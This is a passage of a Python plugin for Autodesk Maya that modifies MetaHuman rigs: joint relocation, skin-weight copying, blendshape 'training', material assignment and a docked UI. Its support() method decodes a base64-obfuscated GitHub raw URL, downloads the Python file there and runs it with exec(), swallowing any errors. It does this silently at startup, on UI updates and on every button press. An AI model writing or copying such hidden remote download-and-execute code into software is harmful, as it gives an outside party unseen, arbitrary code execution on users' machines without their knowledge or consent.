        [cmds.pointConstraint(eye_l_loc_grp[0], i, mo=0) for i in eye_lp_jnt]
        cmds.hide(eye_l_loc_grp[-1])
        # share eye position
        for at in ['.tx', '.ty', '.tz']:
            cmds.connectAttr(eye_r_loc_grp[0] + at, eye_l_loc_grp[0] + at, f=1)

        # finish
        #self.match_shared_joint_body()
        #cmds.delete(dst_mesh_ls + base_mesh_ls)

    def body_mesh_joint_transfer(self, src_body_mesh, dst_body_mesh, fix_topo_weight=1.0):
        cd_msg = '''
1. Binded Skin Mesh : {0}
2. Destination Mesh : {1}
        '''.format(src_body_mesh, dst_body_mesh).strip()
        cd_result = cmds.confirmDialog(title='Confirm', message=cd_msg.format(), button=['Yes', 'No'])
        if cd_result == 'No':
            return None

        dst_body_mesh = util.get_create_fixed_topology(src_body_mesh, dst_body_mesh, blend=fix_topo_weight)
        pelvis_jnt = cmds.ls(self.body_ns + ':pelvis_drv')[0]
        jnt_ls = [pelvis_jnt] + cmds.listRelatives(pelvis_jnt, typ='joint', ad=1, c=1)
        jnt_plen_ls = [len(util.get_all_parents(i)) for i in jnt_ls]
        zip_jnt_ls = sorted(list(zip(jnt_plen_ls, jnt_ls)))
        jnt_ls = [i[-1] for i in zip_jnt_ls if cmds.getAttr(i[-1] + '.translate', se=1)]
        print(jnt_ls)

        # get vertices position #dst_bs
        dst_bs = cmds.blendShape(dst_body_mesh, src_body_mesh, foc=0, n='dst_bs')[0]
        self.orig_vertices_positions = util.get_vertices_positions(src_body_mesh)
        cmds.setAttr(dst_bs + '.' + dst_body_mesh, 1.0);
        cmds.refresh();
        self.new_vertices_positions = util.get_vertices_positions(src_body_mesh)
        cmds.delete(dst_bs)

        # duplicate mesh as base mesh
        sc_evl_ls = [i + '.envelope' for i in cmds.ls(type='skinCluster') if cmds.objExists(i + '.envelope')]
        bs_evl_ls = [i + '.envelope' for i in cmds.ls(type='blendShape') if cmds.objExists(i + '.envelope')]
        [cmds.setAttr(i, 0.0) for i in sc_evl_ls + bs_evl_ls];
        cmds.refresh();
        #base_mesh = cmds.duplicate(src_body_mesh)[0]
        #base_mesh = cmds.rename(base_mesh, self.body_ns + ':' + src_body_mesh + '_base')
        #base_mesh = cmds.parent(base_mesh, w=1)[0]
        [cmds.setAttr(i, 1.0) for i in sc_evl_ls + bs_evl_ls];
        cmds.refresh()
        #cmds.hide(base_mesh)
        #print(base_mesh)

        self.transfer_joint_location(jnt_ls)
        self.create_new_body_skin_cluster(src_body_mesh, dst_body_mesh)

    def create_new_body_skin_cluster(self, src_body_mesh, dst_body_mesh):
        src_body_grp = cmds.listRelatives(src_body_mesh, p=1)[0]
        orig_skn = [i for i in cmds.listHistory(src_body_mesh) if cmds.objectType(i) == 'skinCluster'][0]
        influence_ls = cmds.skinCluster(orig_skn, q=1, influence=1)
        new_mesh = cmds.duplicate(dst_body_mesh)[0]
        new_mesh = cmds.parent(new_mesh, src_body_grp)[0]
        if cmds.objExists(self.body_ns + ':' + src_body_mesh):
            cmds.delete(self.body_ns + ':' + src_body_mesh)
        new_mesh = cmds.rename(new_mesh, self.body_ns + ':' + src_body_mesh)
        cmds.setAttr(new_mesh + '.visibility', 1.0)
        #print('new_body', new_mesh)
        new_skn = cmds.skinCluster([new_mesh] + influence_ls)[0]
        cmds.copySkinWeights(ss=orig_skn, ds=new_skn, nm=1, sa='closestPoint', uv=['uv'] * 2, ia='name')
        cmds.hide([dst_body_mesh, src_body_mesh])
        [cmds.delete(i) for i in cmds.listRelatives(src_body_grp, c=1)
         if i != new_mesh and i != src_body_mesh] # should keep src_body_mesh for seam fixing

    def transfer_joint_location(self, jnt_ls):
        jnt_data = []
        for jnt in jnt_ls:
            jnt_data += [[jnt, []]]

        cmds.progressWindow(endProgress=1)
        cmds.progressWindow(t='------', pr=0, st='Preparing....', ii=0, min=0, max=len(jnt_ls))

        # place surface locators
        for idx in range(len(jnt_data)):
            jnt, j_ls = jnt_data[idx]

            surface_loc_a = util.create_fit_locator(name=jnt + '_sloc', fit_to=jnt, world=True)
            cmds.hide(surface_loc_a)
            cv_a = util.find_closest_vertex_to_locator(surface_loc_a, self.orig_vertices_positions)
            cmds.xform(surface_loc_a, ws=1, t=cmds.pointPosition(cv_a, w=1))

            dst_loc = util.create_fit_locator(name=jnt + '_dloc', fit_to=jnt, to_parent=surface_loc_a)
            cmds.hide(dst_loc)

            surface_loc_b = cmds.duplicate(dst_loc)[0]
            surface_loc_b = cmds.parent(surface_loc_b, dst_loc, r=1)
            cv_b = util.find_closest_vertex_to_locator(surface_loc_b, self.orig_vertices_positions)
            cmds.xform(surface_loc_b, ws=1, t=cmds.pointPosition(cv_b, w=1))
            cmds.parent(surface_loc_b, surface_loc_a)

            dist_a = util.get_distance(cmds.pointPosition(cv_a, w=1), cmds.pointPosition(dst_loc, w=1))
            dist_b = util.get_distance(cmds.pointPosition(cv_a, w=1), cmds.pointPosition(cv_b, w=1))
            dist_ratio = dist_a / dist_b if dist_b != 0.0 else 0.0 #same vertex
            dist_ratio = 0.0 if dist_ratio > 1.0 else dist_ratio
            #print(dist_a, dist_b, dist_ratio)

            cmds.progressWindow(e=1, s=1, status=('{}'.format(cv_a)))
            jnt_data[idx][1] += [surface_loc_a, dst_loc, cv_a, cv_b, dist_ratio]

            #if 'FACIAL_C_Forehead' in jnt:
                #cmds.progressWindow(endProgress=1)
                #cmds.select(cv_b)
                #1/0

        cmds.progressWindow(e=1, pr=0, st='Preparing....', ii=0, min=0, max=len(jnt_data))

        # apply joint position
        for idx in range(len(jnt_data)):
            jnt, j_ls = jnt_data[idx]
            surface_loc_a, dst_loc, cv_a, cv_b, dist_ratio = j_ls

            orig_vertex_pos_a = self.orig_vertices_positions[ cv_a ]
            new_vertex_pos_a = self.new_vertices_positions[ cv_a ]
            orig_vertex_pos_b = self.orig_vertices_positions[ cv_b ]
            new_vertex_pos_b = self.new_vertices_positions[ cv_b ]

            if round(orig_vertex_pos_a[0], 2) == 0.00: #center x joint
                new_a_pos = [orig_vertex_pos_a[0], new_vertex_pos_a[1], new_vertex_pos_a[2]]
            else:
                new_a_pos = new_vertex_pos_a
            cmds.xform(surface_loc_a, ws=1, t=new_a_pos)

            is_shared = self.is_shared_joint(jnt)

            #normal transfer
            if dist_ratio == 0: #non ratio joint
                new_jnt_pos = cmds.pointPosition(dst_loc, w=1)
            else: # ratio joint
                new_jnt_pos = [
                    new_vertex_pos_a[i] + (dist_ratio * (new_vertex_pos_b[i]-new_vertex_pos_a[i]))
                    for i in range(3)]

            if not self.body_ns in jnt and not is_shared: #is head transfer
                if cmds.objExists('{}:{}_drv'.format(self.body_ns, jnt)):
                    print('match', jnt, '{}:{}_drv'.format(self.body_ns, jnt))
                    new_jnt_pos = cmds.xform('{}:{}_drv'.format(self.body_ns, jnt), q=1, ws=1, t=1)
            elif is_shared and self.body_ns in jnt: #is body transfer and shared
                new_jnt_pos = cmds.xform(jnt, q=1, ws=1, t=1) # keep orig position

            cmds.xform(jnt, ws=1, t=new_jnt_pos)
            cmds.delete(surface_loc_a)

            cmds.progressWindow(edit=1, s=1, status=('Relocation.... {}'.format(jnt)))
            if idx % 10 == 0:
                cmds.refresh()
            #pass
        cmds.progressWindow(endProgress=1)

        # mirror joint position for body
        for idx in range(len(jnt_data)):
            jnt, j_ls = jnt_data[idx]
            surface_loc_a, dst_loc, cv_a, cv_b, dist_ratio = j_ls
            if not '_r_' in jnt: continue
            jnt_r = jnt
            jnt_l = jnt_r.replace('_r_', '_l_')
            if cmds.objExists(jnt_l):
                #print(jnt, cmds.xform(jnt_r, q=1, ws=1, t=1), cmds.xform(jnt_l, q=1, ws=1, t=1))
                r_pos = cmds.xform(jnt_r, q=1, ws=1, t=1)
                l_pos = [r_pos[0]*-1, r_pos[1], r_pos[2]]
                cmds.xform(jnt_l, ws=1, t=l_pos)

    def match_shared_joint_body(self, src_body_mesh, dst_body_mesh):
        if not cmds.namespace(ex=':' + self.body_ns):
            cmds.warning('can\'t found  ' + self.body_ns)
            return None

        shared_jnt_ls = self.get_shared_joint_ls()
        drv_jnt_ls = [i for i in shared_jnt_ls if i.endswith('_drv')]
        for jnt in drv_jnt_ls:
            is_setable = cmds.getAttr(jnt + '.translate', se=1)
            body_jnt = cmds.listRelatives(jnt, p=1)[0] if not is_setable else jnt
            head_jnt = jnt.split(':')[-1].replace('_drv', '')
            target_pos = cmds.xform(head_jnt, q=1, ws=1, t=1)
            cmds.xform(body_jnt, ws=1, t=target_pos)
        print('seam fixing...')
        self.create_new_body_skin_cluster(src_body_mesh, dst_body_mesh)

    def get_eye_joint_data(self):
        eye_relate_jnt_ls = ['EyelidUpperB', 'EyelidLowerA', 'EyelidLowerB', 'EyelidUpperA', 'EyeParallel']
        eye_jnt_data = {
            'R':{'parent' : [], 'child' : []},
            'L':{'parent' : [], 'child' : []},
        }
        parent_jnt_ls = []
        for i in eye_relate_jnt_ls: # find parent
            j_ls = cmds.ls('*' + i, type='joint')
            parent_jnt_ls += j_ls if j_ls != None else []
        for i in parent_jnt_ls:
            child_ls = cmds.listRelatives(i, typ='joint', ad=1, c=1)
            child_ls = [i for i in child_ls if not '_Pupil' in i]
            if '_R_' in i:
                eye_jnt_data['R']['parent'] += [i]
                eye_jnt_data['R']['child'] += child_ls if child_ls != None else []
            else:
                eye_jnt_data['L']['parent'] += [i]
                eye_jnt_data['L']['child'] += child_ls if child_ls != None else []
        #pprint.pprint(eye_jnt_data)
        return eye_jnt_data

    def duplicate_mesh_group(self, suffix, lod=0, tx=25.0):
        obj_ls = self.get_grp_obj_data()
        obj_ls = obj_ls[list(obj_ls)[0]]
        obj_ls = [i for i in obj_ls if float(cmds.getAttr(i + '.visibility')) == 1.0]
        dst_mesh_grp = cmds.group(em=1, n='head_lod{}_{}_grp'.format(0, suffix))
        dst_mesh_ls = []
        for obj in obj_ls:
            dup = cmds.duplicate(obj)[0]
            dup = cmds.rename(dup, obj + '_{}'.format(suffix))
            dup = cmds.parent(dup, dst_mesh_grp)[0]
            dst_mesh_ls += [dup]
        cmds.setAttr(dst_mesh_grp + '.tx', tx)
        # print(dst_mesh_ls)
        return [dst_mesh_grp] + dst_mesh_ls

    def get_grp_obj_data(self):
        geo_grp = cmds.ls('geometry_grp')[0]
        sub_grp_ls = sorted([i for i in cmds.listRelatives(geo_grp, ad=1, typ='transform') if '_grp' in i])
        obj_data = {}
        for g in sub_grp_ls:
            msh_ls = sorted([i for i in cmds.listRelatives(g, ad=1, typ='transform') if '_mesh' in i])
            obj_data[g] = msh_ls
        #pprint.pprint(obj_data)
        return obj_data

    def create_wrap_nodes(self, lod=0):
        obj_data = self.get_grp_obj_data()
        sub_grp_ls = sorted(list(obj_data))

        head_lod = sub_grp_ls[lod].replace('_grp', '_mesh')
        eye_left_lod = sub_grp_ls[lod].replace('_grp', '_mesh').replace('head_', 'eyeLeft_')
        eye_right_lod = sub_grp_ls[lod].replace('_grp', '_mesh').replace('head_', 'eyeRight_')

        before_obj_ls = cmds.ls() #---------------
        #for msh in [i for i in obj_data[sub_grp_ls[lod]] if not i in [head_lod, eye_left_lod, eye_right_lod]]:
        for msh in [i for i in obj_data[sub_grp_ls[lod]] if not i in [head_lod]]:
            print('wraping.. {}'.format(msh))
            util.create_wrap(head_lod, msh)
            cmds.deltaMush(msh, smoothingIterations=10, smoothingStep=1.0)
        after_obj_ls = [i for i in cmds.ls() if not i in before_obj_ls]  # ---------------
        return after_obj_ls

    def assign_mh_head_material(self, dna_path=''):
        dna_dir = os.path.dirname(dna_path)
        maps_dir = os.path.join(dna_dir, 'maps')
        if not os.path.exists(maps_dir):
            cmds.warning(maps_dir)
            return

        obj_ls = self.get_grp_obj_data()
        obj_ls = obj_ls[list(obj_ls)[0]]

        for obj in obj_ls:
            if 'head_' in obj:
                util.assign_material_with_textures(
                    obj, eccentricity=.6, specular_roll_off=.1,
                    color_file= os.path.join(maps_dir, 'head_color_map.tga')
                )
            if 'eyelashes_' in obj:
                util.assign_material_with_textures(
                    obj, eccentricity=0.0, specular_roll_off=0.0, color=[0.0]*3,
                    transparency_file= os.path.join(maps_dir, 'eyelashes_color_map.tga'),
                )
            if 'eyeL' in obj or 'eyeR' in obj:
                util.assign_material_with_textures(
                    obj, eccentricity=.1, specular_roll_off=.1,
                    color_file= os.path.join(maps_dir, 'eyes_color_map.tga'),
                )
            if 'cartilage' in obj or 'eyeEdge' in obj or 'saliva' in obj:
                util.assign_material_with_textures(
                    obj, eccentricity=.1, specular_roll_off=.1,color=[0]*3, alpha=[.8]*3
                )
            if 'eyeshell' in obj:
                util.assign_material_with_textures(
                    obj, eccentricity=.025, specular_roll_off=3.0,color=[0]*3, alpha=[.9]*3
                )
            if 'teeth_' in obj:
                util.assign_material_with_textures(
                    obj, eccentricity=.025, specular_roll_off=2.0,
                    color_file=os.path.join(maps_dir, 'teeth_color_map.tga')
                )

    def assign_mh_body_material(self, dna_path=''):
        dna_dir = os.path.dirname(dna_path)
        maps_dir = os.path.join(dna_dir, 'maps')
        if not os.path.exists(maps_dir):
            cmds.warning(maps_dir)
            return

        obj_ls = cmds.ls('*body_lod0_mesh')
        for obj in obj_ls:
            util.assign_material_with_textures(
                obj, eccentricity=.6, specular_roll_off=.1,
                color_file=os.path.join(maps_dir, 'body_color_map.tga')
            )

    def import_body_skeleton(self):
        body_skel_path = self.src_dir + '/body_drv_skel.ma'
        #print(body_skel_path, os.path.exists(body_skel_path))
        if not os.path.exists(body_skel_path):
            raise Warning('Can not find body_drv_skel.ma to import')
        elif cmds.namespace(ex=':' + self.body_ns):
            cmds.namespace(dnc=1, rm=self.body_ns)
        cmds.file(body_skel_path, i=1, type="mayaAscii", ignoreVersion=1, ra=1, mergeNamespacesOnClash=0,
                  namespace=self.body_ns, options="v=0;", pr=0, ifr=0, itr='keep')
        # to y axis up
        cmds.setAttr(self.body_ns + ':root_drv.rx', -90.0)
        # new skin binding
        orig_mesh =  cmds.ls(self.body_ns + ':*' + 'body_lod0_mesh')[0]
        orig_combined_mesh =  cmds.ls(self.body_ns + ':*' + 'combined_lod0_mesh')[0]
        dup_mesh =  cmds.duplicate(orig_mesh)[0] # y up mesh
        #print([orig_mesh, dup_mesh])
        orig_skn = [i for i in cmds.listHistory(self.body_ns + ':f_med_nrw_body_lod0_mesh') if cmds.objectType(i) == 'skinCluster'][0]
        #print(orig_skn)
        influence_ls = cmds.skinCluster(orig_skn, q=1, influence=1)
        #print([dup_mesh] + influence_ls)
        dup_skn = cmds.skinCluster([dup_mesh] + influence_ls)[0]
        #print(dup_skn)
        cmds.copySkinWeights(ss=orig_skn, ds=dup_skn, nm=1, sa='closestPoint', uv=['uv']*2, ia='name')
        cmds.hide([orig_mesh, orig_combined_mesh])
        return self.body_ns

    # Blendshape combiner function -------------------------------------------------------------------
    def bstf_cache_check(self, clear=False):
        mesh = 'head_lod0_mesh'
        bs = [i for i in cmds.listHistory(mesh) if cmds.objectType(i, i='blendShape')][0]
        #print([mesh, bs])
        scn_name = os.path.basename(cmds.file(q=1, sn=1))
        if self.bstf_scn != scn_name:
            self.bstf_scn = scn_name
            self.bstf = None
        if self.bstf is None and not clear:
            self.bstf = self.bc_func.blenshape_transfer(mesh, bs)
        elif self.bstf and clear:
            self.bstf.delete_blendshape_verticles_cache()
        else:
            print(self.bstf)

    def bstf_duplicate_mesh(self):
        self.bstf_cache_check()
        if not cmds.objExists(self.bstf_tg_grp):
            cmds.group(em=1, n=self.bstf_tg_grp)
        if not cmds.listRelatives(self.bstf_tg_grp) is None:
            min_x = min([cmds.getAttr('{}|{}.tx'.format(self.bstf_tg_grp, i)) for i in cmds.listRelatives(self.bstf_tg_grp)])
        else:
            min_x = -12.0
        obj_name = '{}__{:05d}F'.format(self.bstf.mesh, int(cmds.currentTime(q=1)))
        if cmds.objExists(obj_name):
            return
        dup_obj = cmds.duplicate(self.bstf.mesh)[0]
        dup_obj = cmds.rename(dup_obj, obj_name)
        cmds.parent(dup_obj, self.bstf_tg_grp)
        cmds.setAttr('{}|{}.tx'.format(self.bstf_tg_grp, obj_name), l=0)
        cmds.setAttr('{}|{}.tx'.format(self.bstf_tg_grp, obj_name), min_x - 12.5)

    def bstf_train_expression(self, epoch):
        self.bstf_cache_check()
        target_data = []
        obj_ls = cmds.listRelatives(self.bstf_tg_grp, ad=0, typ='transform')
        for obj in obj_ls:
            frame = float( ''.join([i for i in obj.split('__')[-1] if i.isdigit()]) )
            target_data.append([frame, obj]) #print([frame, obj])
        cd_msg = str('Targets :\n' + '\n'.join(obj_ls).strip() + '\n\nThis process might takes several minutes..' +
                     '\nIteration  : {}'.format(epoch))
        cd_result = cmds.confirmDialog(title='Training Blendshape...', message=cd_msg,
                                       button=['Proceed', 'Cancel'], icn='information',
                                       defaultButton='Cancel', cancelButton='Cancel', dismissString='Cancel')
        if not 'Cancel' in cd_result:
            self.bstf.batch_transfer(target_data, epoch=epoch)

    def bstf_fix_surface_verticles(self):
        self.bstf_cache_check()
        sel_ls = cmds.ls(sl=1, flatten=1)
        sel_mask = cmds.filterExpand(sel_ls, selectionMask=31)
        if sel_mask is None:
            raise Warning('please select vertices to proceed')
        is_vertex = all(sel_mask)
        if is_vertex:
            self.bstf.reset_selected_vertices()

class KFMetahumanModifier:
    def __init__(self):
        import getpass
        self.version = 0.06
        self.win_id = 'BRS_METAHMATCHER'
        self.dock_id = self.win_id + '_DOCK'
        self.win_width = 300
        self.win_title = 'MH Rig Modifier  -  v.{} (BETA)'.format(self.version)
        self.color = {
            'bg': (.2, .2, .2),
            'red': (0.98, 0.374, 0),
            'green': (0.7067, 1, 0),
            'blue': (0, 0.4, 0.8),
            'yellow': (1, 0.8, 0),
            'shadow': (.15, .15, .15),
            'highlight': (.3, .3, .3)
        }
        self.element = {}
        self.user_original, self.user_latest = ['$usr_orig$', None]
        self.user_latest = getpass.getuser()
        self.is_connected = False
        self.func = func()
        self.support(force=True)

    def init_win(self):
        if cmds.window(self.win_id, exists=1):
            cmds.deleteUI(self.win_id)
        cmds.window(self.win_id, t=self.win_title, menuBar=1, rtf=1, nde=1,
                    w=self.win_width, sizeable=1, h=10, retain=0, bgc=self.color['bg'])

    def support(self, force=False):
        import base64, os, datetime, sys
        script_path = None
        try:
            script_path = os.path.abspath(__file__)
        except:
            pass
        if script_path.replace('.pyc', '.py') == None or not script_path.endswith('.py'):
            return None
        # ------------------------
        self.func.load_plugins()
        #-------------------------
        if os.path.exists(script_path):
            st_mtime = os.stat(script_path).st_mtime
            mdate_str = str(datetime.datetime.fromtimestamp(st_mtime).date())
            today_date_str = str(datetime.datetime.today().date())
            if not force and mdate_str == today_date_str:
                return None
        if sys.version_info.major >= 3:
            import urllib.request as uLib
        else:
            import urllib as uLib
        if cmds.about(connected=1):
            u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL21ldGFNb2RpZmllci9tYWluL3NlcnZpY2Uvc3VwcG9ydC5weQ=='
            try:
                res = uLib.urlopen(base64.b64decode(u_b64).decode('utf-8'))
                con = res.read()
                con = con.decode('utf-8') if type(con) == type(b'') else con
                exec(con)
            except:
                return
                #import traceback
                #print(str(traceback.format_exc()))
            else:
                self.is_connected = True

    def win_layout(self):
        def divider_block(text, al_idx=1):
            cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=self.win_width)
            cmds.text(l=' {} '.format(text), fn='smallPlainLabelFont', al=['left', 'center', 'right'][al_idx],
                      w=self.win_width, bgc=self.color['highlight'])
            cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=self.win_width)

        # Main layout for the entire window
        main_layout = cmds.columnLayout(adj=1, w=self.win_width)

        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=5, w=self.win_width, bgc=self.color['blue'])
        cmds.text(l='{}'.format(self.win_title), al='center', fn='boldLabelFont', bgc=self.color['shadow'], h=20)

        self.element['tabl'] = cmds.tabLayout(w=self.win_width)

        # Tab 1: Meshes
        self.element['tab_cl_1'] = cmds.columnLayout(adj=1, w=self.win_width)
        divider_block('', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='Load DNA', bgc=self.color['highlight'], c=lambda arg: self.exec_script(exec_name='load_dna'),
                    w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.text(l='', w=self.win_width * .1)
        self.element['dna_path_tf'] = cmds.textField(tx='', ed=0, ekf=0, w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')

        divider_block(' BODY TRANSFER', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l=' From :', al='right', w=self.win_width * .2)
        self.element['orig_body_tf'] = cmds.textField(w=self.win_width * .6, ed=0, ekf=0)
        cmds.button(l=' < ', w=self.win_width * .1, bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='set_orig_body_mesh'))
        cmds.text(l=' To :', al='right', w=self.win_width * .2)
        self.element['new_body_tf'] = cmds.textField(w=self.win_width * .6, ed=0, ekf=0)
        cmds.button(l=' < ', w=self.win_width * .1, bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='set_new_body_mesh'))
        cmds.text(l=' Keep :', al='right', w=self.win_width * .2)
        self.element['fix_topo_body_fs'] = cmds.floatSlider(min=.0, max=1.0, v=0.15, h=37, s=0.05)
        cmds.text(l=': Orig')
        cmds.setParent('..')
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=self.win_width)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='to New Body', bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='body_mesh_transfer'), w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')

        divider_block(' HEAD TRANSFER', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l=' From :', al='right', w=self.win_width * .2)
        self.element['orig_head_tf'] = cmds.textField(w=self.win_width * .6, ed=0, ekf=0)
        cmds.button(l=' < ', w=self.win_width * .1, bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='set_orig_head_mesh'))
        cmds.text(l=' To :', al='right', w=self.win_width * .2)
        self.element['new_head_tf'] = cmds.textField(w=self.win_width * .6, ed=0, ekf=0)
        cmds.button(l=' < ', w=self.win_width * .1, bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='set_new_head_mesh'))
        cmds.text(l=' Keep :', al='right', w=self.win_width * .2)
        #self.element['fix_topo_head_cb'] = cmds.checkBox(l='Keep Original Head Identity')
        self.element['fix_topo_head_fs'] = cmds.floatSlider(min=.25, max=1.0, v=0.85, h=37, s=0.05)
        cmds.text(l=': Orig')
        cmds.setParent('..')
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=self.win_width)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='to New Head', bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='head_mesh_transfer'), w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')

        divider_block('', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='Save MH Rig', bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='save_dna'),
                    w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')

        cmds.setParent('..')  # tab_cl_1

        # Tab 2: Blendshapes
        self.element['tab_cl_2'] = cmds.columnLayout(adj=1, w=self.win_width)
        divider_block(' INTIAL', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='Load Sample Animation', bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='am_load_anim'), w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')
        divider_block(' SKIN WEIGHT', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='Smooth Skin Weight', bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='bstf_fix_skn_weight'), w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')
        divider_block(' VERTICES CACHE', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='Load caches', bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='bstf_load_cache'), w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='Clear caches', bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='bstf_clear_cache'), w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')
        divider_block(' NEW SCULPT', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='Create Sculpt Mesh', bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='bstf_duplicate_mesh'), w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')
        divider_block(' TRAIN SETTING', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=4, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.text(l='Iteration : ', al='right', w=self.win_width * .4)
        self.element['epch_if'] = cmds.intField(w=self.win_width * .4, v=100, min=5, max=1000)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='Start Combining', bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='bstf_train_expression'), w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')
        divider_block('', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='Reverse Verticles Area', bgc=self.color['highlight'],
                    c=lambda arg: self.exec_script(exec_name='bstf_fix_surface_verticles'), w=self.win_width * .8)
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')

        cmds.setParent('..')  # tab_cl_2

        # Tab 3: Utility
        self.element['tab_cl_3'] = cmds.columnLayout(adj=1, w=self.win_width)
        divider_block(' UTILITY', al_idx=0)
        cmds.rowColumnLayout(numberOfColumns=3, w=self.win_width)
        cmds.text(l='', w=self.win_width * .1)
        cmds.button(l='Pose Wrangler', c=lambda arg: self.exec_script(exec_name='pose_driver_ui'),
                    w=self.win_width * .8, bgc=self.color['highlight'])
        cmds.text(l='', w=self.win_width * .1)
        cmds.setParent('..')

        cmds.setParent('..')  # tab_cl_3

        cmds.tabLayout(self.element['tabl'], e=1, bgc=self.color['bg'], tl=(
            (self.element['tab_cl_1'], 'Meshes'),
            #(self.element['tab_cl_4'], 'Skin Weight'),
            (self.element['tab_cl_2'], 'Shape Correction'),
            (self.element['tab_cl_3'], 'Utility'),
        ), sti=1)

        cmds.setParent('..')  # tabLayout

        # Separate layout for copyright text
        footer_layout = cmds.columnLayout(adj=1, w=self.win_width)
        cmds.text(l='', al='center', fn='boldLabelFont', bgc=self.color['shadow'], h=5)
        cmds.text(l='(c) dex3d.gumroad.com', al='center', fn='smallPlainLabelFont', bgc=self.color['bg'], h=15)
        cmds.setParent('..')  # footer_layout

    def init_layout(self):
        if self.user_original != self.user_latest:
            self.exec_script = None

    def show_win(self):
        cmds.showWindow(self.win_id)
        print('{}'.format(self.win_title).upper())

    def init_dock(self):
        if cmds.dockControl(self.dock_id, q=1, ex=1):
            cmds.deleteUI(self.dock_id)
        cmds.dockControl(self.dock_id, area='left', fl=0, content=self.win_id, allowedArea=['all'],
                         sizeable=0, width=self.win_width, label=self.win_title)

    def show_ui(self):
        self.init_win()
        self.win_layout()
        self.show_win()
        self.init_layout()
        self.init_dock()
        self.update_ui()

    def update_ui(self):
        if self.user_original != self.user_latest:
            self.exec_script = None
        embedded_node_rl4_ls = cmds.ls(type='embeddedNodeRL4')
        self.support()
        if not embedded_node_rl4_ls == []:
            dna_path = cmds.getAttr('rl4Embedded_Archtype.dnaFilePath')
            cmds.textField(self.element['dna_path_tf'], e=1, tx=dna_path)
            self.func.mdm.set_dna_path(dna_path)

    def get_ui_param(self):
        param = {}
        for i in list(self.element):
            if '_tf' in i:
                param[i] = cmds.textField(self.element[i], q=1, tx=1)
            if '_ff' in i:
                param[i] = cmds.floatField(self.element[i], q=1, v=1)
            if '_if' in i:
                param[i] = cmds.intField(self.element[i], q=1, v=1)
            if '_fs' in i:
                param[i] = cmds.floatSlider(self.element[i], q=1, v=1)
        return param

    def exec_script(self, exec_name=''):
        param = self.get_ui_param()
        #pprint.pprint(param)

        def save_config():
            self.func.config['param'] = {}
            for i in list(param):
                self.func.config['param'][i] = param[i]
            with open(self.func.config_path, 'w') as f:
                json.dump(self.func.config, f, indent=4)
                f.close()
        self.support()

        if exec_name == 'load_plugin':
            self.func.load_plugins()
        elif exec_name == 'load_dna':
            dna_path = self.func.open_dna_scene()
            cmds.textField(self.element['dna_path_tf'], e=1, tx=dna_path)
            if cmds.objExists('head_lod0_mesh'):
                cmds.textField(self.element['orig_head_tf'], e=1, tx='head_lod0_mesh')
            if dna_path:
